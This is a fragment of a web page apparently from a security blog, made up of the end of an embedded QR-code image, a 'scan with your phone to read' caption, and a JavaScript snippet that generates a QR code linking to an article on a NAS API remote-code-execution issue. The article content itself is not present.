K4G3KRRngZrSG6Lu+YC1QI/fpC+Lm2cyA4qB++ELxznSeE4OTbrMs4ch4LYV1D/DtWzVnlQ8wJNBp4fNQC+9fvt4v9tBvidUHvFsy+de8i9Fr5NNl3PY+FjkHkKjaaNUIIHXS0XvxoFQeRa0445uUxhB5mzDr7qmerYlNDLNr4mR3YDfnMvi9n/daGQFzb5WxfBMw6mGPj1f5KX0Klh+e61giXhU4QypdVUsVlFZdj0shy7Fsbkgtvf70DR8y3NkTdXtnRIjIHcaKBHD7lA4+vj5UYZg7mmHMhOOhoLmP1fjM/+jDXgx771oaMk+/x+zuwG/L+nv3RjKkh1RXMsTOrgX4FIfwqD4IDKvrx8QPvc7+z3mohrge0NcFr33lC15Vvg6jhsXBqiBM3fmYHWkMgugXn8Gi56vRoWW/uVcx8pR85aRx7F5U72tkazqv0MO9lpcux1pAc3P7ndmA35HN7X878HwAAAP//px1FZgAAAAZJREFUAwB9TnObNvzTHAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-safepoints\_api-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 